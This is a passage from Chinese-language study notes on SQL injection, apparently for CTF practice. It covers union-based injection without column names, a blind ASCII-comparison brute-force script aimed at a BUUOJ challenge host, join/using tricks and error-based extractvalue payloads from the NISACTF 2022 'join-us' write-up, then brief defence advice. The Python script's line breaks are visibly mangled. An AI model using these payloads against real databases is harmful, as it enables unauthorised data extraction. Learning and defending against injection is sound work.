|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 14 | admin4   | admin4     |
+----+----------+------------+
select 字段数要和tables数一样
后面用
select `3` from (select 1,2,3 union select * from users)x;
x不可以省略，这是别名
```
如果反引号被过滤了，可以设置别名 as可以省略
```
select b from (select 1 a,2 b,3 c union select * from users)x;
```
#### 通过assic位移无列名注入
首先可以通过类似这样的语句爆出字段数  
`(select 1,2,3) > (select *from teacher)`  
字段数相等会返回1，不相等则会报错
然后通过比较ascii大小爆数据。
脚本
```python
import timeimport  
requestsbaseurl="http://17d5864a-27fc-4fc7-be88-e639f3f55898.node4.buuoj.cn:81/index.php"
def add(flag):    
	res=''    
	res+=flag    
	return res
flag=''
for i in range(1,200):   
	for char in range(32,127):        
		datachar = add(flag+chr(char)) #增加下一个比对的字符串        
		payload='2||((select 1,"{}")>(select * from f1ag_1s_h3r3_hhhhh))'.format(datachar)        
		data = {            
		'id':payload        
		}        
		req=requests.post(url=baseurl,data=data)       
		if "Nu1L" in req.text:            
			flag += chr(char-1)            
			print(flag)            
			break        
		if req.status_code == 429:            
			time.sleep(0.5)
```
#### ban 了columns 但没ban掉information
join 的作用是连接两个表  
在使用别名的时候，表中不能出现相同的字段名  
`(select * from (select * from test as a join test as b) as c);`  
**a、b是同一个表连接，有相同的字段，select c(别名) 时 会报错出相同的列名**  
ps：  
`SELECT *`时，USING会去除USING指定的列 ，可以用来爆破其他列名  
`(select * from (select * from test as a join test as b using(id)) as c);`
#### [NISACTF 2022]join-us
fuzz一下可以发现很多过滤
首先ban了database，or也被过滤
通过不存在的表爆出库名
```
1' || (select * from a)#
Table 'sqlsql.a' doesn't exist
```
可以爆出库名是sqlsql
```
-1' || extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema like 'sqlsql')))#
XPATH syntax error: '~Fal_flag,output'
```
通过报错注入爆出表名`Fal_flag,output` `=`可以用like替换。
因为`columns`被禁了，需要用到无列名注入，
```
tt=1'||extractvalue(0,concat(0x7e,(select * from (select * from output a join output b) c)))#
Duplicate column name 'data'
tt=1'||extractvalue(0,concat(0x7e,(select * from (select * from Fal_flag a join Fal_flag b) c)))#
Duplicate column name 'id'
```
爆数据
```
tt=1'||extractvalue(0,concat(0x7e,(select data from output)))#
NSSCTF{934238de-3c1a-4290-bd
tt=1'||extractvalue(0,concat(0x7e,mid((select data from output),29,48)))#
ea-81d0dce5286c}
```

## 利用SQL注入进行RCE
https://www.cnblogs.com/piaomiaohongchen/p/17505136.html

## 防御
1.使用预编译；  
黑名单：对特殊的字符例如括号斜杠进行转义过滤删除；  
白名单：对用户的输入进行正则表达式匹配限制；  
2.规范编码以及字符集，否者攻击者可以通过编码绕过检查；  
3.参数化查询：原理是将用户输入的查询参数作为参数传，而不直接将它们拼接到SQL语而言，将SQL语句和参数分离开来，并通过占位符（一般使用问号“？”）将它们关联起来，这样用户的输入只会被当作参数



































## 参考文章
https://ireel.github.io/2025/06/06/sql-plus/
https://www.freebuf.com/articles/web/414356.html
https://www.cnblogs.com/gk0d/p/16866411.html
https://blog.csdn.net/2302_78449782/article/details/145635717
https://j-0k3r.github.io/2023/12/04/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/
[SQL 注入攻防：绕过注释符过滤的N种方法_sql注入去除注释符绕过-CSDN博客](https://blog.csdn.net/haishiqiguai/article/details/151854004)
https://docs.pingcode.com/baike/1851756
